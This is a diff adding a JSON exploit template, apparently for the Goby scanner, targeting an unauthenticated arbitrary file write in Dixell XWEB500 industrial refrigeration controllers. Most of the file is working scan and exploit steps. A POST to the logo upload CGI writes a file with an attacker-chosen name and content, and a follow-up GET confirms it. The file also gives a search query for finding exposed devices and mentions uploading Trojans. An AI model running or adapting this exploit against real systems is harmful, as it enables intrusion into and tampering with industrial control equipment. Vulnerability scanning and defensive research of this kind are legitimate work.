@@ -1,0 +1,202 @@
+{
+  "Name": "Dixell XWEB500 Arbitrary File Write",
+  "Description": "<p>Dixell XWEB500 is a small to medium network computer control and monitoring server suitable for managing industrial and commercial refrigeration systems.<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Dixell XWEB500 has security vulnerabilities, unauthorized users can write arbitrary files and access, upload Trojan horses and other malicious behaviors.</span><br></p>",
+  "Product": "Dixell XWEB500",
+  "Homepage": "https://climate.emerson.com/en-de/shop/1/dixell-electronics-sku-xweb500-evo-en-gb",
+  "DisclosureDate": "2022-03-23",
+  "Author": "abszse",
+  "FofaQuery": "body=\"/cgi-bin/xweb500.cgi\"",
+  "GobyQuery": "body=\"/cgi-bin/xweb500.cgi\"",
+  "Level": "2",
+  "Impact": "<p>Dixell XWEB500 has security vulnerabilities, unauthorized users can write arbitrary files and access, upload Trojan horses and other malicious behaviors.<br></p>",
+  "Recommendation": "<p>Set access permissions, set whitelist</p><p>Keep an eye on the official website for updates: <a href=\"https://climate.emerson.com/\">https://climate.emerson.com/</a></p>",
+  "References": [
+    "https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/other/dixell-xweb500-filewrite.yaml"
+  ],
+  "Is0day": false,
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "filename",
+      "type": "input",
+      "value": "123.txt",
+      "show": ""
+    },
+    {
+      "name": "filebody",
+      "type": "input",
+      "value": "dixell-xweb500-filewrite",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/cgi-bin/logo_extra_upload.cgi",
+        "follow_redirect": false,
+        "header": {
+          "Content-Type": "application/octet-stream"
+        },
+        "data_type": "text",
+        "data": "abszse.txt\ndixell-xweb500-filewrite"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/logo/abszse.txt",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "dixell-xweb500-filewrite",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/cgi-bin/logo_extra_upload.cgi",
+        "follow_redirect": false,
+        "header": {
+          "Content-Type": "application/octet-stream"
+        },
+        "data_type": "text",
+        "data": "{{{filename}}}\n{{{filebody}}}"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/logo/{{{filename}}}",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody||"
+      ]
+    }
+  ],
+  "Tags": [
+    "任意⽂件创建"
+  ],
+  "VulType": [
+    "任意⽂件创建"
+  ],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "10",
+  "Translation": {
+    "CN": {
+      "Name": "Dixell XWEB500 系统任意文件写入漏洞",
+      "Product": "Dixell XWEB500",
+      "Description": "<p>Dixell XWEB500 是中小型网络计算机控制和监控服务器，适用于管理工业和商业制冷系统。</p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Dixell XWEB500存在安全漏洞，未授权用户可写入任意文件并访问，上传木马等恶意行为。</span><br></p>",
+      "Recommendation": "<p>设置访问权限、设置白名单</p><p>及时关注官网更新：<a href=\"https://climate.emerson.com/\">https://climate.emerson.com/</a></p>",
+      "Impact": "<p>Dixell XWEB500存在安全漏洞，未授权用户可写入任意文件并访问，上传木马等恶意行为。<br></p>",
+      "VulType": [
+        "file upload"
+      ],
+      "Tags": [
+        "file upload"
+      ]
+    },
+    "EN": {
+      "Name": "Dixell XWEB500 Arbitrary File Write",
+      "Product": "Dixell XWEB500",
+      "Description": "<p>Dixell XWEB500 is a small to medium network computer control and monitoring server suitable for managing industrial and commercial refrigeration systems.<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Dixell XWEB500 has security vulnerabilities, unauthorized users can write arbitrary files and access, upload Trojan horses and other malicious behaviors.</span><br></p>",
+      "Recommendation": "<p>Set access permissions, set whitelist</p><p>Keep an eye on the official website for updates: <a href=\"https://climate.emerson.com/\">https://climate.emerson.com/</a></p>",
+      "Impact": "<p>Dixell XWEB500 has security vulnerabilities, unauthorized users can write arbitrary files and access, upload Trojan horses and other malicious behaviors.<br></p>",
+      "VulType": [
+        "Arbitrary File Creation"
+      ],
+      "Tags": [
+        "Arbitrary File Creation"
+      ]
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
